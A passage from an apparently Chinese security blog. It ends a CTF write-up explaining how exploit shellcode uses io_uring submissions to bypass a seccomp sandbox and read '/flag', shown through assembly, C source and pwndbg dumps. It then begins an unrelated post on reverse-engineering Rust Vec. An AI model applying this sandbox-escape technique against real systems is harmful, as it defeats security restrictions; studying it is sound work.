*sq-&gt;kring_mask]</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<p>下面的<code>io_uring_submit</code>的改编也就是将原来的函数调用扁平化，去掉了所有的call以及跳转，让整段代码顺序执行。通过代码不难发现，提交任务的操作实际上是通过<code>io_uring_enter</code>这个系统调用实现的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">			     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	flags = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">			flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line">		<span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">			flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">		ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">					   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		ret = submitted;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">		sq-&gt;sqe_head = tail;</span><br><span class="line">		<span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">			IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">io_uring_submit_func:</span><br><span class="line">sub rsp, 8</span><br><span class="line">mov r10, QWORD PTR [rdi+0x8]</span><br><span class="line">mov edx, DWORD PTR [rdi+0x40]</span><br><span class="line">mov r8d, DWORD PTR [rdi+0x44]</span><br><span class="line">mov eax, DWORD PTR [r10]</span><br><span class="line">sub r8d, edx</span><br><span class="line">mov rcx, QWORD PTR [rdi+0x10]</span><br><span class="line">mov r9,QWORD PTR [rdi+0x30]</span><br><span class="line">add r8d,eax</span><br><span class="line">mov ecx,DWORD PTR [rcx]</span><br><span class="line">nop DWORD PTR [rax+0x0]</span><br><span class="line">mov esi,eax</span><br><span class="line">and edx,ecx</span><br><span class="line">add eax,0x1</span><br><span class="line">and esi,ecx</span><br><span class="line">mov DWORD PTR [r9+rsi*4],edx</span><br><span class="line">mov edx,DWORD PTR [rdi+0x40]</span><br><span class="line">add edx,0x1</span><br><span class="line">mov DWORD PTR [rdi+0x40],edx</span><br><span class="line">mov DWORD PTR [r10],eax</span><br><span class="line">mov rdx,QWORD PTR [rdi]</span><br><span class="line">sub eax,DWORD PTR [rdx]</span><br><span class="line">xor edx,edx</span><br><span class="line">mov esi,eax</span><br><span class="line">mov eax,DWORD PTR [rdi+0xc0]</span><br><span class="line">mov ecx,eax</span><br><span class="line">and ecx,0x2</span><br><span class="line">mov r8d,ecx</span><br><span class="line">or r8d,0x1</span><br><span class="line">test al,0x1</span><br><span class="line">cmovne ecx,r8d</span><br><span class="line">mov edi,DWORD PTR [rdi+0xc4]</span><br><span class="line">mov r9,r8</span><br><span class="line">mov r8d,ecx</span><br><span class="line">mov ecx,edx</span><br><span class="line">mov edx,esi</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x1aa</span><br><span class="line">push r15</span><br><span class="line">push 0x8</span><br><span class="line">call syscall_func</span><br><span class="line">pop rdx</span><br><span class="line">pop rcx</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p><code>io_uring_get_cqe</code>函数的处理方式与上面一个函数类似，也是将其扁平化。</p>
<p>下面我们主要分析一下最前面执行的这一大段shellcode的功能。需要注意的是，原exp中是将’/flag’字符串放在了这段shellcode后面，对应于这一页中偏移为0x3F9的地址。</p>
<p>第一次进行系统调用是<code>io_uring_setup</code>，需要2个参数，第1个参数设置提交队列和完成队列的队列项数，传入的参数是1，第2个参数是一个<code>io_uring_params</code>结构体实例，这里传入一个被0清空的栈空间。执行系统调用后，返回的文件描述符为3，这个结构体的内容发生改变：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x7fff373c83e8</span><br><span class="line">00:0000│ rsi rbp 0x7fff373c83e8 ◂— 0x200000001</span><br><span class="line">01:0008│         0x7fff373c83f0 ◂— 0x0</span><br><span class="line">02:0010│         0x7fff373c83f8 ◂— 0x1fff00000000</span><br><span class="line">03:0018│         0x7fff373c8400 ◂— 0x0</span><br><span class="line">04:0020│         0x7fff373c8408 ◂— 0x0</span><br><span class="line">05:0028│         0x7fff373c8410 ◂— 0x4000000000</span><br><span class="line">06:0030│         0x7fff373c8418 ◂— 0x10800000100</span><br><span class="line">07:0038│         0x7fff373c8420 ◂— 0x11000000114</span><br><span class="line">08:0040│  0x7fff373c8428 ◂— 0x180</span><br><span class="line">09:0048│  0x7fff373c8430 ◂— 0x0</span><br><span class="line">0a:0050│  0x7fff373c8438 ◂— 0xc000000080</span><br><span class="line">0b:0058│  0x7fff373c8440 ◂— 0x10c00000104</span><br><span class="line">0c:0060│  0x7fff373c8448 ◂— 0x1400000011c</span><br><span class="line">0d:0068│  0x7fff373c8450 ◂— 0x118</span><br><span class="line">0e:0070│  0x7fff373c8458 ◂— 0x0</span><br><span class="line">0f:0078│  0x7fff373c8460 ◂— 0x0</span><br><span class="line"></span><br><span class="line">struct io_uring_params &#123;</span><br><span class="line">	__u32 sq_entries;                   // 1</span><br><span class="line">	__u32 cq_entries;                   // 2</span><br><span class="line">	__u32 flags;                        // 0</span><br><span class="line">	__u32 sq_thread_cpu;                // 0</span><br><span class="line">	__u32 sq_thread_idle;               // 0</span><br><span class="line">	__u32 features;                     // 0x1FFF</span><br><span class="line">	__u32 wq_fd;                        // 0</span><br><span class="line">	__u32 resv[3];                      // 0, 0, 0</span><br><span class="line">	struct io_sqring_offsets &#123;</span><br><span class="line">        __u32 head;                     // 0</span><br><span class="line">        __u32 tail;                     // 0x40</span><br><span class="line">        __u32 ring_mask;                // 0x100</span><br><span class="line">        __u32 ring_entries;             // 0x108</span><br><span class="line">        __u32 flags;                    // 0x114</span><br><span class="line">        __u32 dropped;                  // 0x110</span><br><span class="line">        __u32 array;                    // 0x180</span><br><span class="line">        __u32 resv1;                    // 0</span><br><span class="line">        __u64 user_addr;                // 0</span><br><span class="line">    &#125;sq_off;</span><br><span class="line">	struct io_cqring_offsets &#123;</span><br><span class="line">        __u32 head;                     // 0x80</span><br><span class="line">        __u32 tail;                     // 0xC0</span><br><span class="line">        __u32 ring_mask;                // 0x104</span><br><span class="line">        __u32 ring_entries;             // 0x10C</span><br><span class="line">        __u32 overflow;                 // 0x11C</span><br><span class="line">        __u32 cqes;                     // 0x140</span><br><span class="line">        __u32 flags;                    // 0x118</span><br><span class="line">        __u32 resv1;                    // 0</span><br><span class="line">        __u64 user_addr;                // 0</span><br><span class="line">    &#125;cq_off;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到，这里保存了SQE、CQE的一些项在内核页中的偏移，接下来我们只需要通过<code>mmap</code>，设置fd为3即可将这个内核页共享到用户空间。</p>
<p>下面的<code>mmap64</code>的参数分别为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned long addr = 0</span><br><span class="line">unsigned long len = 0x184</span><br><span class="line">unsigned long prot = 3 (PROT_READ | PROT_WRITE)</span><br><span class="line">unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)</span><br><span class="line">unsigned long fd = 3</span><br><span class="line">unsigned long off = 0</span><br></pre></td></tr></table></figure>
<p><code>mmap</code>之后，将会返回一个0x1000的内存空间，这段内存空间即使在gdb中也无法进行读取。</p>
<p>后面紧跟着一个循环6次的loop1循环，其作用是将CQE和SQE的相关地址保存到栈中。然后又是一个mmap，参数为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">unsigned long addr = 0</span><br><span class="line">unsigned long len = 0x40</span><br><span class="line">unsigned long prot = 3 (PROT_READ | PROT_WRITE)</span><br><span class="line">unsigned long flags = 0x8001 (MAP_POPULATE | MAP_SHARED)</span><br><span class="line">unsigned long fd = 3</span><br><span class="line">unsigned long off = 0x10000000</span><br></pre></td></tr></table></figure>
<p>获取了一个offset为0x10000000，大小为一页的内存空间。通过查询源码得知，这是<code>io_uring_mmap</code>的一部分：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_SQ_RING		0ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_CQ_RING		0x8000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_SQES			0x10000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_PBUF_RING		0x80000000ULL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_PBUF_SHIFT		16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IORING_OFF_MMAP_MASK		0xf8000000ULL</span></span><br></pre></td></tr></table></figure>
<p>可以看到内核这里预先定义了偏移，所以通过<code>mmap</code>设置偏移为<code>IORING_OFF_SQES</code>实际上也就是获取了SQE，即提交队列中的所有项的保存位置。然后，通过调用<code>io_uring_get_sqe</code>获取提交队列项，手动将<code>openat2</code>的opcode（0x1C）以及其他的参数保存到sqe中，在上面的shellcode里面是提交的openat2，实际上<code>openat</code>也是完全没问题的。随后使用<code>io_uring_submit</code>提交任务，使用<code>io_uring_get_cqe</code>获取完成队列中该任务完成的结果，返回一个文件描述符4。后面的读与写和打开类似，也是这样的流程。因此在最后一次调用<code>io_uring_get_cqe</code>时，能够直接输出。不过这个输出也是有概率的，多试几次必然能够输出内容。</p>
<p>以上就是使用<code>io_uring</code>异步输出系统绕过seccomp进行文件读写的分析。当然<code>io_uring</code>本身的功能是我们在开发过程中实际上更应该重视的。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-5/" class="post-title-link" itemprop="url">Rust逆向学习 (5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-10 20:24:50" itemprop="dateCreated datePublished" datetime="2023-11-10T20:24:50+08:00">2023-11-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-11-11 13:30:27" itemprop="dateModified" datetime="2023-11-11T13:30:27+08:00">2023-11-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>10k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本文将对Rust中的通用集合类型——动态数组<code>Vec</code>进行学习，对应参考书中的第8章。</p>
<h1 id="reverse-for-vec"><a class="markdownIt-Anchor" href="#reverse-for-vec"></a> Reverse for Vec</h1>
<p><code>Vec</code>是Rust中的动态数据结构，与C++中的<code>vector</code>功能类似。实际上Rust中的<code>String</code>就是一个特殊的<code>Vec</code>，这可以通过查看Rust的内核代码证实。</p>
<h2 id="vec-与-添加元素"><a class="markdownIt-Anchor" href="#vec-与-添加元素"></a> vec! 与 添加元素</h2>
<p><code>vec!</code>是一个宏，用于快速初始化数组元素。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, x.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 168</span><br><span class="line">        mov     edi, 12</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    alloc::alloc::exchange_malloc</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        and     rax, 3</span><br><span class="line">        cmp     rax, 0</span><br><span class="line">        sete    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB31_1</span><br><span class="line">        jmp     .LBB31_2</span><br><span class="line">.LBB31_1:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 32]</span><br><span class="line">        mov     dword ptr [rsi], 1</span><br><span class="line">        mov     dword ptr [rsi + 4], 2</span><br><span class="line">        mov     dword ptr [rsi + 8], 3</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::slice::&lt;impl [T]&gt;::into_vec@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     qword ptr [rsp + 24], rdi</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        call    rax</span><br><span class="line">        mov     rdi, qword ptr [rsp + 24]</span><br><span class="line">        mov     rax, qword ptr [rip + alloc::vec::Vec&lt;T,A&gt;::push@GOTPCREL]</span><br><span class="line">        mov     esi, 4</span><br><span class="line">        call    rax</span><br><span class="line">        jmp     .LBB31_5</span><br></pre></td></tr></table></figure>
<p>第一段中，我们可以发现<code>vec!</code>宏执行时，汇编实际上执行的是什么操作。首先调用了一个<code>exchange_malloc</code>函数，传入第一个参数为12，第二个参数为4，根据源码可以判断出，第一个参数应该是总的内存分配字节数量，第二个参数为每个元素的字节数量。这个函数的返回值是<code>Box&lt;[i32]&gt;</code>，这是Rust中的一个智能指针类型，能够在堆分配内存并管理生命周期，指针保存在栈中。后面对返回值进行了判断，如果内存分配失败则会输出错误信息。Box的特性如下，参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_21484461/article/details/131731732?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169961961316800226578680%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169961961316800226578680&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-131731732-null-null.142%5Ev96%5Econtrol&amp;utm_term=Rust%20Box&amp;spm=1018.2226.3001.4187">传送门</a></p>
<blockquote>
<p>在栈上存储指针，指向堆上的数据。<br />
在转移所有权时负责释放堆上的内存。<br />
大小固定，适用于已知大小的类型。<br />
只能有一个所有者，不可共享引用。</p>
</blockquote>
<p>随后，代码中以<code>rsi</code>作为指针，初始化了3个数组元素。初始化完成后调用<code>into_vec</code>将<code>Box</code>转换为<code>Vec</code>类型。可以说，上面源码中的<code>vec!</code>宏基本等同于：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">b</span>: <span class="type">Box</span>&lt;[<span class="type">i32</span>]&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = b.<span class="title function_ invoke__">into_vec</span>();</span><br></pre></td></tr></table></figure>
<p>经过调试发现，调用<code>into_vec</code>后，<code>Vec</code>实例中的指针与<code>Box</code>的指针相同，但现在<code>Box</code>类型已经不复存在了，其所有权已经被转移到<code>Vec</code>中。</p>
<p>随后，程序调用了<code>push</code>方法扩充了<code>Vec</code>的空间，但原先的地址空间不足以容纳新的元素，因此需要将原先的内存空间释放掉再重新分配。考虑到Rust在汇编层调用的是libc，所以堆管理那套本质上还是<code>malloc</code>、<code>free</code>那些函数，与C/C++相同，方便进行分析。</p>
<p>在动态数组大小发生改变时，如果存在一个已有的对某个元素的引用，那么大小改变后该引用可能会指向被释放的空间，这是Rust所不能允许的，这就要回到所有权规则的定义。考虑存在不可变引用的情况，如果此时需要增加数组的长度，那么首先在增加前必然需要获取该动态数组的可变引用，而所有权规则不允许一个实例同时存在可变引用和不可变引用，因此导致编译失败。</p>
<h2 id="元素访问"><a class="markdownIt-Anchor" href="#元素访问"></a> 元素访问</h2>
<p>Rust中有两种方式访问动态数组中的元素，第一种是直接通过下标访问：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.LBB33_5:</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::index::Index&lt;I&gt;&gt;::index@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 40]</span><br><span class="line">        mov     esi, 2</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        jmp     .LBB33_6</span><br></pre></td></tr></table></figure>
<p>这是加<code>&amp;</code>的汇编代码，第一个参数就是<code>Vec</code>实例地址，第二个参数是索引值，第三个参数疑似指向工程名的字符串切片，推测是在索引越界后输出错误信息用的。这里实际上是调用了<code>index</code>方法进行索引。这个<code>index</code>函数的返回值是一个地址，如果加了<code>&amp;</code>，则直接对指针进行操作，如果不加则会直接解引用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">; 不加&amp;</span><br><span class="line">.LBB32_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     eax, dword ptr [rax]</span><br><span class="line">        mov     dword ptr [rsp + 68], eax</span><br><span class="line">        lea     rax, [rsp + 68]</span><br><span class="line"></span><br><span class="line">; 加&amp;</span><br><span class="line">.LBB33_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 16]</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rax, [rsp + 64]</span><br></pre></td></tr></table></figure>
<p>第二种元素访问的方法是使用<code>get</code>方法：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">x</span> = <span class="built_in">vec!</span>[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">    x.<span class="title function_ invoke__">push</span>(<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = x.<span class="title function_ invoke__">get</span>(<span class="number">2</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.LBB35_5:</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;alloc::vec::Vec&lt;T,A&gt; as core::ops::deref::Deref&gt;::deref@GOTPCREL]</span><br><span class="line">        lea     rdi, [rsp + 72]</span><br><span class="line">        call    rax</span><br><span class="line">        mov     qword ptr [rsp + 40], rdx</span><br><span class="line">        mov     qword ptr [rsp + 48], rax</span><br><span class="line">        jmp     .LBB35_6</span><br><span class="line">.LBB35_6:</span><br><span class="line">        mov     rsi, qword ptr [rsp + 40]</span><br><span class="line">        mov     rdi, qword ptr [rsp + 48]</span><br><span class="line">        mov     rax, qword ptr [rip + core::slice::&lt;impl 